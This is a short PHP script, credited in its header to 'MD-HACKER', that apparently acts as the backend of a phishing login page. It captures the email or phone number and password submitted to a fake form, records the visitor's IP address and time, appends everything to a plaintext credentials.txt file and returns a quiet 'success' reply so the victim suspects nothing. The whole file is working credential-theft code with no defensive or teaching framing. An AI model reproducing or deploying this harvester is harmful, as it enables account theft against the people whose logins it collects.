<?php

# credentials.php by MD-HACKER
# Author   : MD-HACKER
# Github   : https://github.com/MD-HACKER07
# Website  : https://abushalem.site/
# Instagram: https://www.instagram.com/iammd_18_
# LinkedIn : https://in.linkedin.com/in/md-abu-shalem-alam-726a93292
# Date     : 24-04-2024

$file = 'credentials.txt';

// Get the login credentials
$email_or_phone = isset($_POST['email_or_phone']) ? $_POST['email_or_phone'] : 'unknown';
$password = isset($_POST['password']) ? $_POST['password'] : 'unknown';
$remember_me = isset($_POST['remember_me']) ? $_POST['remember_me'] : false;

// Get IP and timestamp
$ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown';
$date = date('Y-m-d H:i:s');

// Format the data
$data = "==========[ LOGIN DETAILS ]==========\n";
$data .= "Email/Phone: $email_or_phone\n";
$data .= "Password: $password\n";
$data .= "Remember Me: " . ($remember_me ? 'Yes' : 'No') . "\n";
$data .= "IP Address: $ip\n";
$data .= "Date/Time: $date\n";
$data .= "=====================================\n\n";

// Write to file
file_put_contents($file, $data, FILE_APPEND);

// Return success response
header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
?> 